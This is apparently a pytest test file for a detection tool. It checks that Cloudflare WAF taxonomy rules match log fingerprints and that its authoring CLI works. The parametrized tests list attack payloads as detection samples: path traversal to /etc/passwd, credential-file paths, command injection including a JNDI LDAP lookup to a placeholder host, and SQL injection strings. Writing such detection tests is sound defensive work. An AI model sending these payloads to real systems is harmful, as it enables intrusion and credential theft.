"""Internal taxonomy: matching against a fingerprint, and the authoring workflow."""

from __future__ import annotations

import json
import re
from pathlib import Path

import pytest

from engine.matching import taxonomy_matcher
from engine.matching.candidate import MatchSource
from engine.profiling.data_classifier import DataCategory
from engine.profiling.field_profiler import FieldProfile, LogFingerprint
from engine.storage import db, taxonomy_store
from engine.storage.taxonomy_store import TaxonomyEntry
from scripts import taxonomy as taxonomy_cli
from scripts.seed_taxonomy import DEFAULT_SEED_FILE


def _fingerprint(**overrides) -> LogFingerprint:
    defaults = dict(
        profiles=[
            FieldProfile(field_name="ClientIP", dtype="string", cardinality=8, null_rate=0.0,
                         suggested_ecs_field="source.ip"),
            FieldProfile(field_name="ClientRequestQuery", dtype="string", cardinality=11, null_rate=0.7,
                         suggested_ecs_field="url.query"),
            FieldProfile(field_name="Action", dtype="string", cardinality=4, null_rate=0.0),
        ],
        inferred_category="webserver",
        inferred_product="cloudflare",
        inferred_service="firewall_events",
        data_category=DataCategory.APPLICATION_LOGS,
        record_count=37,
    )
    defaults.update(overrides)
    return LogFingerprint(**defaults)


def _entry(**overrides) -> TaxonomyEntry:
    defaults = dict(
        slug="cloudflare-test",
        name="Cloudflare test entry",
        logsource_category="webserver",
        logsource_product="cloudflare",
        logsource_service="firewall_events",
        data_category="application_logs",
        required_fields=["ClientIP", "Action"],
        mitre_techniques=["T1190"],
        confidence=0.8,
    )
    defaults.update(overrides)
    return TaxonomyEntry(**defaults)


# ------------------------------------------------------------------- matching


def test_matches_an_entry_for_this_log_source():
    candidates = taxonomy_matcher.match(_fingerprint(), [_entry()])

    assert len(candidates) == 1
    candidate = candidates[0]
    assert candidate.source is MatchSource.INTERNAL_TAXONOMY
    assert candidate.rule_ref == "internal:cloudflare-test"
    assert candidate.matched_fields == {"ClientIP": "ClientIP", "Action": "Action"}
    assert candidate.mitre_techniques == ["T1190"]


def test_entry_for_another_product_is_excluded():
    assert taxonomy_matcher.match(_fingerprint(), [_entry(logsource_product="fortinet")]) == []


def test_contradicting_data_category_excludes_the_entry():
    assert taxonomy_matcher.match(_fingerprint(), [_entry(data_category="dns_logs")]) == []


def test_unknown_sample_data_category_does_not_veto_a_logsource_match():
    """The data category is a coarser signal; not knowing it should not block."""
    candidates = taxonomy_matcher.match(_fingerprint(data_category=None), [_entry()])

    assert len(candidates) == 1


def test_curator_confidence_is_a_ceiling():
    """A perfect structural match cannot score above what the author claimed."""
    candidates = taxonomy_matcher.match(_fingerprint(), [_entry(confidence=0.5)])

    assert candidates[0].confidence <= 0.5


def test_fields_resolve_through_ecs_like_the_sigma_matcher():
    entry = _entry(required_fields=["source.ip"])

    candidate = taxonomy_matcher.match(_fingerprint(), [entry])[0]

    assert candidate.matched_fields == {"source.ip": "ClientIP"}


def test_missing_required_field_is_flagged_as_not_feasible():
    entry = _entry(required_fields=["ClientIP", "SomethingAbsent"])

    candidate = taxonomy_matcher.match(_fingerprint(), [entry])[0]

    assert candidate.missing_fields == ["SomethingAbsent"]
    assert "NOT feasible as written" in candidate.reasoning
    assert candidate.confidence < 0.8


def test_entry_with_no_satisfiable_field_is_dropped():
    entry = _entry(required_fields=["Absent1", "Absent2"])

    assert taxonomy_matcher.match(_fingerprint(), [entry]) == []


def test_assumptions_are_carried_onto_the_candidate():
    entry = _entry(assumptions=["the query string is URL-decoded at ingest"])

    candidate = taxonomy_matcher.match(_fingerprint(), [entry])[0]

    assert candidate.assumptions == ["the query string is URL-decoded at ingest"]
    assert "1 documented assumption" in candidate.reasoning


def test_min_confidence_filters():
    assert taxonomy_matcher.match(_fingerprint(), [_entry()], min_confidence=0.95) == []


def test_shipped_seed_entries_match_the_cloudflare_fixture():
    """The Phase 0 seed entries must still resolve against the sample they were written for."""
    from pathlib import Path

    from engine.ingestion import parser
    from engine.profiling.data_classifier import classify
    from engine.profiling.field_profiler import build_fingerprint, profile_fields
    from scripts.seed_taxonomy import DEFAULT_SEED_FILE

    fixture = Path(__file__).parent / "fixtures" / "cloudflare_waf_firewall_events.csv"
    sample = parser.parse(fixture)
    profiles = profile_fields(sample.records, field_names=sample.field_names)
    fingerprint = build_fingerprint(
        profiles, classify(sample.field_names), record_count=sample.record_count
    )

    entries = taxonomy_store.load_entries_from_json(DEFAULT_SEED_FILE)
    candidates = taxonomy_matcher.match(fingerprint, entries)

    assert {candidate.rule_ref for candidate in candidates} == {
        "internal:cloudflare-waf-sqli",
        "internal:cloudflare-waf-credential-stuffing",
        "internal:cloudflare-waf-path-traversal",
        "internal:cloudflare-waf-sensitive-path-access",
        "internal:cloudflare-waf-rce-command-injection",
    }
    assert all(not candidate.missing_fields for candidate in candidates)


# ------------------------------------------------- the ported WAF patterns


def _pattern(slug: str, field: str) -> str:
    """Pull one field's regex out of the shipped seed file."""
    entries = {e.slug: e for e in taxonomy_store.load_entries_from_json(DEFAULT_SEED_FILE)}
    for block in entries[slug].detection_logic.values():
        if isinstance(block, dict) and f"{field}|re" in block:
            return block[f"{field}|re"]
    raise AssertionError(f"{slug} has no regex on {field}")


def _fires(slug: str, field: str, value: str, *, lucene: bool = False) -> bool:
    """Does any clause on `field` fire on `value`, under one of two readings?

    ``lucene=False`` is Sigma's own and is what the taxonomy matcher and the
    backtest implement: literals compared case-insensitively, regex unanchored.

    ``lucene=True`` is what Elastic actually runs: literals case-sensitive,
    regex anchored to the whole field value. A pattern that only passes the
    first drafts a rule that cannot run, which is the gap docs/BACKLOG.md 1.11
    closed. Both are asserted so it cannot quietly reopen.
    """
    entries = {e.slug: e for e in taxonomy_store.load_entries_from_json(DEFAULT_SEED_FILE)}
    for block in entries[slug].detection_logic.values():
        if not isinstance(block, dict):
            continue
        for raw, spec in block.items():
            name, _, modifier_text = str(raw).partition("|")
            if name != field:
                continue
            modifiers = [m for m in modifier_text.split("|") if m]
            for item in (spec if isinstance(spec, list) else [spec]):
                item = str(item)
                if "re" in modifiers:
                    hit = re.fullmatch(item, value) if lucene else re.search(item, value)
                elif "endswith" in modifiers:
                    hit = (value.endswith(item) if lucene
                           else value.lower().endswith(item.lower()))
                elif "contains" in modifiers:
                    hit = item in value if lucene else item.lower() in value.lower()
                else:
                    hit = item == value if lucene else item.lower() == value.lower()
                if hit:
                    return True
    return False


def _both(slug: str, field: str, value: str) -> tuple[bool, bool]:
    return _fires(slug, field, value), _fires(slug, field, value, lucene=True)


@pytest.mark.parametrize(
    "payload",
    [
        "../../etc/passwd",
        "..%2f..%2fetc%2fpasswd",
        "%2e%2e%2fetc%2fpasswd",
        "%252e%252e%252fetc",
        r"..\..\windows\win.ini",
        "%c0%ae%c0%ae%c0%afetc",
        "%2E%2E%2Fetc",  # uppercase, which the lowercase-only list would miss
    ],
)
def test_path_traversal_covers_its_documented_encodings(payload):
    assert _both("cloudflare-waf-path-traversal", "ClientRequestPath", payload) == (True, True)


@pytest.mark.parametrize(
    "payload",
    ["/.env", "/portal/.git/HEAD", "/wp-login.php", "/admin/config.php", "/web.config",
     "/docker-compose.yml", "/docker-compose.yaml", "/.aws/credentials", "/x/id_rsa",
     "/.ssh/id_rsa", "/.htpasswd", "/.npmrc", "/.dockercfg", "/.DS_Store",
     "/composer.lock", "/package-lock.json", "/wp-admin/install.php", "/.svn/entries"],
)
def test_sensitive_path_covers_its_documented_artefacts(payload):
    assert _both("cloudflare-waf-sensitive-path-access", "ClientRequestPath", payload) == (True, True)


@pytest.mark.parametrize("sample", ["/.env.example", "/.env.sample"])
def test_a_dotenv_sample_file_is_not_an_exposed_dotenv(sample):
    """What the original's `\\.env$` was for; endswith is how it survives Lucene."""
    assert _both("cloudflare-waf-sensitive-path-access", "ClientRequestPath", sample) == (False, False)


@pytest.mark.parametrize(
    "payload",
    ["?cmd=;cat /etc/passwd", "${jndi:ldap://x.example/a}", "?q=`id`", "?x=system(",
     "?x=passthru(", "?x=shell_exec(", "?a=1 || whoami", "?a=%0aid", "?a=%0Aid",
     "?p=powershell -enc AAA", "?p=PowerShell -enc AAA"],
)
def test_rce_covers_its_documented_sinks(payload):
    assert _both("cloudflare-waf-rce-command-injection", "ClientRequestQuery", payload) == (True, True)


@pytest.mark.parametrize(
    "payload",
    ["id=1 UNION SELECT 1", "id=1 UnIoN SeLeCt 1", "id=1 union/**/select 1",
     "id=1 OR 1=1", "q=select name from users", "id=1' or '", "id=1 AND sleep(5)",
     "t=information_schema.tables", "x=xp_cmdshell", "x=waitfor delay '0:0:5'"],
)
def test_sqli_covers_its_documented_payloads(payload):
    assert _both("cloudflare-waf-sqli", "ClientRequestQuery", payload) == (True, True)


def test_the_rce_pattern_still_spells_passthru_correctly():
    """The source pattern had passwthru, which can never match the real PHP function."""
    assert _both("cloudflare-waf-rce-command-injection", "ClientRequestQuery",
                 "?x=passthru(ls)") == (True, True)
    assert _both("cloudflare-waf-rce-command-injection", "ClientRequestQuery",
                 "?x=passwthru(ls)") == (False, False)


def test_the_rce_word_boundary_survived_losing_word_boundaries():
    """Lucene has no \\b; the substitute still has to refuse 'ecosystem('."""
    assert _both("cloudflare-waf-rce-command-injection", "ClientRequestQuery",
                 "q=ecosystem(1)") == (False, False)
    assert _both("cloudflare-waf-rce-command-injection", "ClientRequestQuery",
                 "q=system(1)") == (True, True)


def test_the_rce_pattern_bounds_its_expression_match():
    """Unbounded ${.*} swallows an unrelated span of a large body."""
    pattern = _pattern("cloudflare-waf-rce-command-injection", "ClientRequestQuery")

    assert r"\$\{[^}]{1,100}\}" in pattern


@pytest.mark.parametrize(
    "clean",
    ["/products", "/id/news/blog", "?category=shoes&page=2", "/portal/default.aspx",
     "/blog/environment", "/configuration/index.html", "/docs/2.4.1/release"],
)
def test_the_ported_patterns_leave_ordinary_traffic_alone(clean):
    for slug, field in (
        ("cloudflare-waf-path-traversal", "ClientRequestPath"),
        ("cloudflare-waf-sensitive-path-access", "ClientRequestPath"),
        ("cloudflare-waf-rce-command-injection", "ClientRequestPath"),
    ):
        assert _both(slug, field, clean) == (False, False), f"{slug} fired on {clean}"


# Constructs Lucene's RegExp engine does not have, plus the characters it
# reserves. See docs/BACKLOG.md 1.11.
_NOT_IN_LUCENE = (
    (re.compile(r"\\[sdwbSDWB]"), "class escape: a backslash escapes a literal in Lucene"),
    (re.compile(r"\(\?[a-zA-Z]"), "inline flag: Lucene has none, and it is a parse error"),
    (re.compile(r"(?<!\\)(?<!\[)[\^$]"), "anchor: ^ and $ are literal characters in Lucene"),
    (re.compile(r"(?<!\\)[@&~<>#\"]"), "unescaped character Lucene reserves"),
)


def test_no_seeded_regex_uses_a_construct_elastic_cannot_run():
    """Sigma is PCRE; Elastic's engine is Lucene's, and the gap is silent.

    Without this, a `\\s` added to an entry would keep passing every behaviour
    test above - Python honours it - while the drafted Elastic query quietly
    matched the letter s instead.
    """
    problems = []
    for entry in taxonomy_store.load_entries_from_json(DEFAULT_SEED_FILE):
        for block, spec in entry.detection_logic.items():
            if not isinstance(spec, dict):
                continue
            for raw, value in spec.items():
                if "|re" not in str(raw):
                    continue
                for probe, why in _NOT_IN_LUCENE:
                    if probe.search(str(value)):
                        problems.append(f"{entry.slug}.{block}.{raw}: {why}")

    assert problems == []


def test_every_seeded_regex_is_anchored_for_lucene():
    """Lucene matches the whole field value, so a substring search needs .* ends."""
    for entry in taxonomy_store.load_entries_from_json(DEFAULT_SEED_FILE):
        for spec in entry.detection_logic.values():
            if not isinstance(spec, dict):
                continue
            for raw, value in spec.items():
                if "|re" not in str(raw):
                    continue
                assert str(value).startswith(".*"), f"{entry.slug}: {raw} is not anchored"
                assert str(value).endswith(".*"), f"{entry.slug}: {raw} is not anchored"


def test_attack_score_entry_fires_only_when_the_payload_was_not_blocked():
    """Tier 1 of the team's runbook: a low score matters when nothing stopped it."""
    from engine.ingestion import parser
    from engine.prediction.backtest import backtest
    from engine.profiling.data_classifier import classify
    from engine.profiling.field_profiler import build_fingerprint, profile_fields

    fixture = Path(__file__).parent / "fixtures" / "cloudflare_http_requests_attackscore.csv"
    sample = parser.parse(fixture)
    profiles = profile_fields(sample.records, field_names=sample.field_names)
    fingerprint = build_fingerprint(profiles, classify(sample.field_names),
                                    record_count=sample.record_count)
    entries = {e.slug: e for e in taxonomy_store.load_entries_from_json(DEFAULT_SEED_FILE)}
    candidates = {c.rule_ref: c for c in taxonomy_matcher.match(fingerprint, list(entries.values()))}

    slug = "cloudflare-waf-low-attack-score-not-blocked"
    assert f"internal:{slug}" in candidates

    result = backtest(candidates[f"internal:{slug}"], sample.records, fingerprint,
                      taxonomy_entry=entries[slug])

    assert result.evaluated, result.unsupported_reason
    # Lines 11-14 are score <= 20 with log/allow/skip; 8-10 are score <= 20 but
    # block/managedChallenge/jschallenge and must stay quiet.
    assert result.example_lines == [11, 12, 13, 14]
    assert result.matched_events == 4


def test_firewall_event_entries_do_not_claim_an_http_requests_sample():
    """Different Cloudflare datasets; the logsource service keeps them apart."""
    from engine.ingestion import parser
    from engine.profiling.data_classifier import classify
    from engine.profiling.field_profiler import build_fingerprint, profile_fields

    fixture = Path(__file__).parent / "fixtures" / "cloudflare_http_requests_attackscore.csv"
    sample = parser.parse(fixture)
    profiles = profile_fields(sample.records, field_names=sample.field_names)
    fingerprint = build_fingerprint(profiles, classify(sample.field_names),
                                    record_count=sample.record_count)
    entries = taxonomy_store.load_entries_from_json(DEFAULT_SEED_FILE)

    refs = {c.rule_ref for c in taxonomy_matcher.match(fingerprint, entries)}

    assert refs == {"internal:cloudflare-waf-low-attack-score-not-blocked"}


def test_ported_entries_find_exactly_the_attacks_in_the_fixture():
    from engine.ingestion import parser
    from engine.prediction.backtest import backtest
    from engine.profiling.data_classifier import classify
    from engine.profiling.field_profiler import build_fingerprint, profile_fields

    fixture = Path(__file__).parent / "fixtures" / "cloudflare_waf_firewall_events.csv"
    sample = parser.parse(fixture)
    profiles = profile_fields(sample.records, field_names=sample.field_names)
    fingerprint = build_fingerprint(profiles, classify(sample.field_names),
                                    record_count=sample.record_count)
    entries = {e.slug: e for e in taxonomy_store.load_entries_from_json(DEFAULT_SEED_FILE)}
    candidates = {c.rule_ref: c for c in taxonomy_matcher.match(fingerprint, list(entries.values()))}

    def lines(slug: str) -> list[int]:
        result = backtest(candidates[f"internal:{slug}"], sample.records, fingerprint,
                          taxonomy_entry=entries[slug])
        assert result.evaluated, result.unsupported_reason
        return result.example_lines

    assert lines("cloudflare-waf-path-traversal") == [13]           # /static/../../etc/passwd
    assert lines("cloudflare-waf-sensitive-path-access") == [34, 35, 36]  # wp-login, .env, config.php
    assert lines("cloudflare-waf-rce-command-injection") == []      # no RCE payload in this sample


# ----------------------------------------------------------- authoring workflow


@pytest.fixture()
def db_path(tmp_path):
    path = tmp_path / "engine.db"
    db.init_db(path)
    return path


def test_template_is_a_valid_entry(tmp_path, capsys):
    assert taxonomy_cli.main(["template"]) == 0
    written = tmp_path / "template.json"
    written.write_text(capsys.readouterr().out, encoding="utf-8")

    entries = taxonomy_store.load_entries_from_json(written)

    assert len(entries) == 1
    assert entries[0].slug == "vendor-product-behavior"


def test_import_then_list_then_export_round_trips(tmp_path, db_path, capsys):
    source = tmp_path / "entry.json"
    source.write_text(json.dumps({"entries": [_entry().model_dump()]}), encoding="utf-8")

    assert taxonomy_cli.main(["--db", str(db_path), "import", str(source)]) == 0
    assert "inserted cloudflare-test" in capsys.readouterr().out

    assert taxonomy_cli.main(["--db", str(db_path), "list"]) == 0
    assert "cloudflare-test" in capsys.readouterr().out

    exported = tmp_path / "export.json"
    assert taxonomy_cli.main(["--db", str(db_path), "export", str(exported)]) == 0
    capsys.readouterr()

    reloaded = taxonomy_store.load_entries_from_json(exported)
    assert reloaded[0].slug == "cloudflare-test"
    assert reloaded[0].required_fields == ["ClientIP", "Action"]


def test_import_is_idempotent(tmp_path, db_path, capsys):
    source = tmp_path / "entry.json"
    source.write_text(json.dumps({"entries": [_entry().model_dump()]}), encoding="utf-8")

    taxonomy_cli.main(["--db", str(db_path), "import", str(source)])
    taxonomy_cli.main(["--db", str(db_path), "import", str(source)])
    output = capsys.readouterr().out

    assert "updated cloudflare-test" in output.replace("  ", " ")
    with db.connection(db_path) as conn:
        assert taxonomy_store.count(conn) == 1


def test_validate_warns_about_entries_that_parse_but_disappoint(tmp_path, capsys):
    source = tmp_path / "weak.json"
    source.write_text(
        json.dumps({"entries": [{
            "slug": "weak", "name": "Weak entry", "suggested_rule_type": "magic",
        }]}),
        encoding="utf-8",
    )

    assert taxonomy_cli.main(["validate", str(source)]) == 0
    output = capsys.readouterr().out

    assert "not a known type" in output
    assert "no required_fields" in output
    assert "will match every sample" in output


def test_validate_rejects_an_unknown_key(tmp_path, capsys):
    source = tmp_path / "typo.json"
    source.write_text(
        json.dumps({"entries": [{"slug": "x", "name": "X", "assumption": "typo"}]}), encoding="utf-8"
    )

    assert taxonomy_cli.main(["validate", str(source)]) == 1


def test_delete_removes_an_entry(tmp_path, db_path, capsys):
    source = tmp_path / "entry.json"
    source.write_text(json.dumps({"entries": [_entry().model_dump()]}), encoding="utf-8")
    taxonomy_cli.main(["--db", str(db_path), "import", str(source)])

    assert taxonomy_cli.main(["--db", str(db_path), "delete", "cloudflare-test"]) == 0
    assert taxonomy_cli.main(["--db", str(db_path), "delete", "cloudflare-test"]) == 1
